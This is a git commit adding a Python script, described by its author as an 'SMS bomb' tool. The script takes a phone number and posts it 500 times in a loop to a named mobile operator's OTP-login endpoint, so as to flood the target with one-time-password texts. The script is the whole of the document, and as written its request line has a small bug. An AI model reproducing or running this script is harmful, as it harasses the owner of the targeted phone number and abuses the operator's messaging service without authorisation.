e36d74f8663f27f6f46c4a0487bbcd2113ba7301
ATFHACKERBOYS <84493035+ATFHACKERBOYS@users.noreply.github.com>
2021-05-20 11:46:25 +0600

    Add files via upload
    This is a SMS bomb new upcoming tools,

---
+++ otp.py
@@ -0,0 +1,10 @@
+import requests
+
+# post
+number=str(input("Enter Your number:"))
+myblapi="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
+data={"mobile":+number}
+
+for i in range(500):
+	requests.post(myblapi,data=data)
+	print(str(i+1)+"sms send")
